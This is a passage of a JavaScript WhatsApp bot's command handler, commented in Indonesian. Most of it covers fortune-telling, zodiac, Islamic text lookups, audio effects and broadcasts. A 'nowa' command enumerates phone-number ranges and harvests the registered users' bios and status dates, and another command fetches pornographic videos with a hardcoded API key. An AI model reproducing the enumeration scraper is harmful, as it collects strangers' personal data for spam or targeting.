break
//=================================================//
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
/*
case 'banghwsound1':
case 'banghwsound2':
case 'banghwsound3':
case 'banghwsound4':
case 'banghwsound5':
case 'banghwsound6':
case 'banghwsound7':
case 'banghwsound8':
case 'banghwsound9':
case 'banghwsound10':
case 'banghwsound11':
case 'banghwsound12':
case 'banghwsound13':
case 'banghwsound14':
case 'banghwsound15':
case 'banghwsound16':
case 'banghwsound17':
case 'banghwsound18':
case 'banghwsound19':
case 'banghwsound20':
case 'banghwsound21':
case 'banghwsound22':
case 'banghwsound23':
case 'banghwsound24':
case 'banghwsound25':
case 'banghwsound26':
case 'banghwsound27':
case 'banghwsound28':
case 'banghwsound29':
case 'banghwsound30':
case 'banghwsound31':
case 'banghwsound32':
case 'banghwsound33':
case 'banghwsound34':
case 'banghwsound35':
case 'banghwsound36':
case 'banghwsound37':
case 'banghwsound38':
case 'banghwsound39':
case 'banghwsound40':
case 'banghwsound41':
case 'banghwsound42':
case 'banghwsound43':
case 'banghwsound44':
case 'banghwsound45':
case 'banghwsound46':
case 'banghwsound47':
case 'banghwsound48':
case 'banghwsound49':
case 'banghwsound50':
case 'banghwsound51':
case 'banghwsound52':
case 'banghwsound53':
case 'banghwsound54':
case 'banghwsound55':
case 'banghwsound56':
case 'banghwsound57':
case 'banghwsound58':
case 'banghwsound59':
case 'banghwsound60':
case 'banghwsound61':
case 'banghwsound62':
case 'banghwsound63':
case 'banghwsound64':
case 'banghwsound65':
case 'banghwsound66':
case 'banghwsound67':
case 'banghwsound68':
case 'banghwsound69':
case 'banghwsound70':
case 'banghwsound71':
case 'banghwsound72':
case 'banghwsound73':
case 'banghwsound74':
case 'banghwsound75':
case 'banghwsound76':
case 'banghwsound77':
case 'banghwsound78':
case 'banghwsound79':
case 'banghwsound80':
case 'banghwsound81':
case 'banghwsound82':
case 'banghwsound83':
case 'banghwsound84':
case 'banghwsound85':
case 'banghwsound86':
case 'banghwsound87':
case 'banghwsound88':
case 'banghwsound89':
case 'banghwsound90':
case 'banghwsound91':
case 'banghwsound92':
case 'banghwsound93':
case 'banghwsound94':
case 'banghwsound95':
case 'banghwsound96':
case 'banghwsound97':
case 'banghwsound98':
case 'banghwsound99':
case 'banghwsound100':
case 'banghwsound101':
case 'banghwsound102':
case 'banghwsound103':
case 'banghwsound104':
case 'banghwsound105':
case 'banghwsound106':
case 'banghwsound107':
case 'banghwsound108':
case 'banghwsound109':
case 'banghwsound110':
case 'banghwsound111':
case 'banghwsound112':
case 'banghwsound113':
case 'banghwsound114':
case 'banghwsound115':
case 'banghwsound116':
case 'banghwsound117':
case 'banghwsound118':
case 'banghwsound119':
case 'banghwsound120':
case 'banghwsound121':
case 'banghwsound122':
case 'banghwsound123':
case 'banghwsound124':
case 'banghwsound125':
case 'banghwsound126':
case 'banghwsound127':
case 'banghwsound128':
case 'banghwsound129':
case 'banghwsound130':
case 'banghwsound131':
case 'banghwsound132':
case 'banghwsound133':
case 'banghwsound134':
case 'banghwsound135':
case 'banghwsound136':
case 'banghwsound137':
case 'banghwsound138':
case 'banghwsound139':
case 'banghwsound140':
case 'banghwsound141':
case 'banghwsound142':
case 'banghwsound143':
case 'banghwsound144':
case 'banghwsound145':
case 'banghwsound146':
case 'banghwsound147':
case 'banghwsound148':
case 'banghwsound149':
case 'banghwsound150':
case 'banghwsound151':
case 'banghwsound152':
case 'banghwsound153':
case 'banghwsound154':
case 'banghwsound155':
case 'banghwsound156':
case 'banghwsound157':
case 'banghwsound158':
case 'banghwsound159':
case 'banghwsound160':
case 'banghwsound161':
 if (isBan) throw sticBanLu(from)
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break*/
//=================================================//
case 'bcgc': case 'bcgroup': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Youtube',
url: 'https://youtube.com/c/HwModsWa857'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6285714170944'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Telegram',
id: 'sc'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
haikal.send5ButImg(i, txt, haikal.user.name, global.thumb, btn)
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//=================================================//
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Youtube',
url: 'https://youtube.com/c/HwModsWa857'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6285714170944'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Telegram',
id: 'sc'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
haikal.send5ButImg(yoi, txt, haikal.user.name, global.thumb, btn)
}
reply('Sukses Broadcast')
}
break
//=================================================//
/*
case 'cerpen':{
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`

Judul cerpen yang tersedia lihat di list *CERPEN MENU*
 
cerpen anak
cerpen bahasa daerah
cerpen bahasa inggrisKak
cerpen bahasa jawa
cerpen bahasa sunda
cerpen budaya
cerpen cinta
cerpen cinta islami
cerpen cinta pertama
cerpen cinta romantis
cerpen cinta sedih
cerpen cinta segitiga
cerpen cinta sejati
cerpen galau
cerpen gokil
cerpen inspiratif
cerpen jepang
cerpen kehidupan
cerpen keluarga
cerpen kisah nyata
cerpen korea
cerpen kristen
cerpen liburan
cerpen lingkungan
cerpen lucu
cerpen malaysia
cerpen mengharukan
cerpen misteri
cerpen motivasi
cerpen nasihat
cerpen nasionalisme
cerpen olahraga
cerpen patah hati
cerpen penantian
cerpen pendidikan
cerpen pengalaman pribadi
cerpen pengorbanan
cerpen penyesalan
cerpen perjuangan
cerpen perpisahan
cerpen persahabatan
cerpen petualangan
cerpen ramadhan
cerpen remaja
cerpen renungan
cerpen rindu
cerpen rohani
cerpen romantis
cerpen sastra
cerpen sedih
cerpen sejarah
cerpen slice of life
cerpen terjemahan
cerpen thriller

`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`Cerpen ${q}`)
await haikal.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
}
break*/
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'ringtone': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./baseikal/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
//=================================================//
case 'iqra': {
if (isBan) throw sticBanLu(from)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
}
break
//=================================================//
case 'juzamma': {
if (isBan) throw sticBanLu(from)
if (args[0] === 'pdf') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
} else if (args[0] === 'docx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
} else if (args[0] === 'pptx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
} else if (args[0] === 'xlsx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
} else {
reply(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
reply(`No. ${number}
${arab}
${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'tafsirsurah': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
}
break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) throw 'Hash not found in database'
global.db.sticker[hash].locked = !/^un/i.test(command)
reply('Done!')
}
break
//=================================================//
case 'public': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
haikal.public = true
reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
haikal.public = false
reply('Sukses Change To Self')
}
break
//=================================================//
case 'nowa': {
if (isBan) return sticBanLu(from)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'ping': case 'pong': case 'peng': {
if (isBan) throw sticBanLu(from)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
🌷 RESPONS  ${latensi.toFixed(4)}
🌷 AKTIF Selama : ${runtime(process.uptime())}
🌷 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
🔥 MEMORY NODEJS 🔥
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) m.reply(stdout)
if (stderr.trim()) m.reply(stderr)
}
}
break
//=================================================//
case 'kalkulator': case 'kal': {
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//=================================================//
case 'banghwbokep':{
if (isBan) throw sticBanLu(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
}
break
//=================================================//
case 'penjara':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}`
reply(teks)
break
//=================================================//
case 'antilink': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
